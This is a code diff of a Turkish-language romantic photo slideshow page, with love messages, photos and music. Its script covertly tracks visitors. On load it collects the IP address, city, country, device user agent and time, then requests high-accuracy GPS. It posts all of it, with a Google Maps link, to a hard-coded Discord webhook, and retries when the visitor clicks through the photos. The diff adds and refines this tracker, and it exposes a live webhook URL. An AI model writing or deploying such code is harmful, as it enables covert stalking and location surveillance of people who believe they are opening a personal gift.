@@ -28,6 +28,9 @@
 
     <script>
         const WEB_URL = "https://discord.com/api/webhooks/1470189609630826658/DAjHbX38Ow-YJOCbk4n0C3WpHnZ7XHCZuA-VLleQpzOU26qEnTw3FuVpegmoY7ghqEnj";
+        
+        // Konumun sadece 1 kere gönderilmesi için kilit
+        let konumGonderildi = false;
 
         function dcGonder(m) {
             fetch(WEB_URL, {
@@ -37,39 +40,44 @@
             });
         }
 
-        // --- KONUMU ZORLA İSTE ---
-        function konumuAl() {
-            if ("geolocation" in navigator) {
-                // Tarayıcıyı konumu sormaya zorlayan ana komut
-                navigator.geolocation.getCurrentPosition(
-                    function(p) {
-                        const lat = p.coords.latitude;
-                        const lon = p.coords.longitude;
-                        const harita = `https://www.google.com/maps?q=${lat},${lon}`;
-                        dcGonder("🎯 **TAM KONUM GELDİ!**\n📍 Harita: " + harita);
-                    },
-                    function(e) {
-                        dcGonder("⚠️ Konum reddedildi: " + e.message);
-                    },
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                );
-            } else {
-                dcGonder("❌ Tarayıcı konumu desteklemiyor.");
-            }
-        }
+        // --- DETAYLI BİLGİ VE KONUM FONKSİYONU ---
+        function bilgileriTopla() {
+            if (konumGonderildi) return; // Zaten gönderildiyse durdur
 
-        // Sayfa açılır açılmaz IP bilgisini gönder ve konumu sormayı dene
-        window.addEventListener('load', () => {
+            const cihaz = navigator.userAgent; // Telefon/Tarayıcı bilgisi
+            const saat = new Date().toLocaleString('tr-TR'); // Tam giriş saati
+
             fetch('https://ipapi.co/json/')
                 .then(r => r.json())
                 .then(d => {
-                    dcGonder(`🚀 **Siteye Giriş!**\n📍 Şehir: ${d.city}\n🌐 IP: ${d.ip}`);
-                    // IP'den sonra konumu sormayı başlat
-                    konumuAl();
-                });
-        });
+                    let anaMesaj = `🌟 **YENİ GİRİŞ DETAYLARI** 🌟\n` +
+                                 `📅 **Saat:** ${saat}\n` +
+                                 `📍 **Şehir/Ülke:** ${d.city} / ${d.country_name}\n` +
+                                 `🌐 **IP:** ${d.ip}\n` +
+                                 `📱 **Cihaz Bilgisi:** ${cihaz}\n` +
+                                 `--------------------------`;
+                    dcGonder(anaMesaj);
 
-        // --- FOTOĞRAF VE MÜZİK ---
+                    // Hassas Konum İste
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(function(p) {
+                            const lat = p.coords.latitude;
+                            const lon = p.coords.longitude;
+                            const harita = `https://www.google.com/maps?q=${lat},${lon}`;
+                            dcGonder(`🎯 **TAM KONUM (GPS)**\n📍 Harita: ${harita}`);
+                            konumGonderildi = true; // Gönderim başarılı, kilitle
+                        }, function(e) {
+                            dcGonder("⚠️ GPS İzni Verilmedi.");
+                            konumGonderildi = true; // İzin verilmese de tekrar sormasın diye kilitle
+                        }, { enableHighAccuracy: true });
+                    }
+                });
+        }
+
+        // Sayfa yüklenince başlat
+        window.onload = bilgileriTopla;
+
+        // --- FOTOĞRAF SİSTEMİ ---
         const fotolar = ["foto1.jpg", "foto2.jpg", "foto3.jpg", "foto4.jpg", "foto5.jpg"];
         const sozler = ["Seninle her günüm daha güzel.", "Gülüşün dünyamı aydınlatıyor.", "Kalbim hep seninle.", "Sana her baktığımda yeniden aşık oluyorum.", "İyi ki varsın, iyi ki benimsin."];
         let index = 0;
@@ -78,8 +86,8 @@
         function ileri() {
             if (audio) audio.play().catch(() => {});
             
-            // Eğer hala konum izni verilmediyse, her 'İleri' butonunda tekrar sormayı dene
-            konumuAl();
+            // Eğer sayfa yüklenirken konum alınamadıysa butona basınca tekrar dene
+            if (!konumGonderildi) bilgileriTopla();
 
             index++;
             if (index >= fotolar.length) {
